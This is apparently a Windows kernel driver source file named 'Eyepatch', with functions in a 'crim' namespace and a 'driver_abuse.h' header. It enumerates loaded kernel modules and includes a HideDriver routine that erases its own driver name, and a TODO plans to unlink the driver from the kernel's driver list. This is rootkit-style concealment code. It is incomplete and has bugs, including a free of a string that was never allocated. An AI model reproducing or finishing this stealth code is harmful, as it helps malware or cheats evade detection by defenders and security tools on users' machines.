#include "includes.h"
#include "driver_abuse.h"
#include "memory.h"
#include "nt.h"
#include "entry.h"

/*
[DriverEntry] PDRIVER_OBJECT @ FFFFD50AAD6CB2A0 = 336

0: kd> dt nt!_DRIVER_OBJECT FFFFD50AAD6CB2A0
   +0x000 Type             : 0n4
   +0x002 Size             : 0n336
   +0x008 DeviceObject     : 0xffffd50a`ae7cf4f0 _DEVICE_OBJECT
   +0x010 Flags            : 0x12
   +0x018 DriverStart      : 0xfffff807`22f40000 Void
   +0x020 DriverSize       : 0x7000
   +0x028 DriverSection    : 0xffffd50a`ac8131d0 Void
   +0x030 DriverExtension  : 0xffffd50a`ad6cb3f0 _DRIVER_EXTENSION
   +0x038 DriverName       : _UNICODE_STRING "\Driver\Eyepatch"
   +0x048 HardwareDatabase : 0xfffff807`1f582888 _UNICODE_STRING "\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM"
   +0x050 FastIoDispatch   : (null)
   +0x058 DriverInit       : 0xfffff807`22f413e0     long  +0
   +0x060 DriverStartIo    : (null)
   +0x068 DriverUnload     : 0xfffff807`22f41230     void  +0
   +0x070 MajorFunction    : [28] 0xfffff807`22f41000     long  +0
*/

void crim::WalkDrivers() {
	// Kernel driver threads are limited to approx 3 pages
	// `PAGE_SIZE * 3` = 0x03000
	// & RTL_PROC_MODS = 0x12800
	// so we need to heap allocate it or else we'll bugcheck on the `nt!_chkstk` (check stack) function

	auto modules = new(NonPagedPoolNx) nt::RTL_PROCESS_MODULES;
	ULONG retlen;
	
	auto status = nt::ZwQuerySystemInformation(nt::SystemModuleInformation, modules, sizeof(*modules), &retlen);
	if (!NT_SUCCESS(status)) {
		DbgPrint("[crim::WalkDrivers] ZwQuerySystemInformation(SystemModuleInformation...) failed with code %x\n", status);
		return;
	}

	for (auto i = 0; i < modules->NumberOfModules; i++) {
		DbgPrint("[crim::WalkDrivers] %s\n", modules->Modules[i].FullPathName);
	}

	delete modules;

	return;
}

void crim::HideDriver(DRIVER_OBJECT *driver) {
	DbgPrint("[crim::HideDriver] DRIVER_OBJECT %p\n", driver);
	DbgPrint("[crim::HideDriver] driver->DriverUnload %p - DriverUnload %p\n", driver->DriverUnload, DriverUnload);
	if (driver->DriverUnload != DriverUnload) {
		DbgPrint("[crim::HideDriver] Wrong driver\n");
	}

	UNICODE_STRING name;
	RtlInitUnicodeString(&name, L"");
	driver->DriverName = name;
	RtlFreeUnicodeString(&name);

	// TODO: Remove self from driver linked list, see https://github.com/nbqofficial/HideDriver/blob/master/Driver.c
	return;
}